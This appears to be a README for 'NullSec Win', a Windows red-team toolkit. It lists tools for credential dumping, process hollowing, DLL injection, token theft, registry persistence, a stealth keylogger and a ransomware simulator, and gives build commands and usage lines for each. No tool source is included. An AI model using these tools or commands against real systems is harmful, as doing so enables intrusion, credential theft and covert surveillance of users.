# 🪟 NullSec Win

**Fast, native Windows security tools written in Go, Rust, and C**

> High-performance red team and penetration testing utilities for Windows systems

[![Twitter](https://img.shields.io/badge/Twitter-@AnonAntics-blue)](https://twitter.com/AnonAntics)
[![Discord](https://img.shields.io/badge/Discord-killers-7289da)](https://discord.gg/killers)

## 🚀 Tools

### Go Tools (Fast, Cross-compilable)

| Tool | Description |
|------|-------------|
| `creds_dump.go` | Extract credentials (Credential Manager, WiFi, browsers) |
| `hollow.go` | Process hollowing for code injection |
| `regpersist.go` | Registry-based persistence management |
| `token.go` | Token manipulation and privilege escalation |

### Rust Tools (Memory-safe, Blazing Fast)

| Tool | Description |
|------|-------------|
| `nullsec-crypt` | File encryptor/ransomware simulator for testing |

### C Tools (Native Win32 API)

| Tool | Description |
|------|-------------|
| `dll_inject.c` | DLL injection via CreateRemoteThread |
| `keylogger.c` | Low-level keyboard hook keylogger |

## 🔧 Building

### Go (Cross-compile from Linux/Mac)
```bash
cd go
GOOS=windows GOARCH=amd64 go build -o nullsec-creds.exe creds_dump.go
GOOS=windows GOARCH=amd64 go build -o nullsec-hollow.exe hollow.go
GOOS=windows GOARCH=amd64 go build -o nullsec-regpersist.exe regpersist.go
GOOS=windows GOARCH=amd64 go build -o nullsec-token.exe token.go
```

### Rust
```bash
cd rust
cargo build --release --target x86_64-pc-windows-msvc
# Or cross-compile:
cargo build --release --target x86_64-pc-windows-gnu
```

### C (Cross-compile with MinGW)
```bash
cd c
x86_64-w64-mingw32-gcc -o nullsec-inject.exe dll_inject.c
x86_64-w64-mingw32-gcc -o nullsec-keylog.exe keylogger.c -luser32
```

## 📖 Usage Examples

### Credential Dumper
```cmd
nullsec-creds.exe -all     # Dump all credentials
nullsec-creds.exe -wifi    # WiFi passwords only
nullsec-creds.exe -browser # Browser credential paths
```

### Token Manipulation
```cmd
nullsec-token.exe -list       # List processes with users
nullsec-token.exe -priv       # Show current privileges
nullsec-token.exe -getsystem  # Attempt SYSTEM escalation
nullsec-token.exe -steal 1234 # Steal token from PID
```

### Registry Persistence
```cmd
nullsec-regpersist.exe -list
nullsec-regpersist.exe -add backdoor -value "C:\payload.exe"
nullsec-regpersist.exe -remove backdoor
```

### DLL Injection
```cmd
nullsec-inject.exe -l                      # List processes
nullsec-inject.exe -p 1234 -d payload.dll  # Inject by PID
nullsec-inject.exe -n notepad.exe -d beacon.dll
```

### Process Hollowing
```cmd
nullsec-hollow.exe -list                   # List target processes
nullsec-hollow.exe -target notepad.exe -file shellcode.bin
```

### Keylogger
```cmd
nullsec-keylog.exe                # Log to console
nullsec-keylog.exe -o keylog.txt  # Log to file
nullsec-keylog.exe -s             # Stealth mode (hidden)
```

## ⚠️ Disclaimer

These tools are for **authorized security testing only**. Unauthorized use is illegal.

---

**NullSec Framework** | [GitHub](https://github.com/bad-antics) | [@AnonAntics](https://twitter.com/AnonAntics) | [Discord](https://discord.gg/killers)
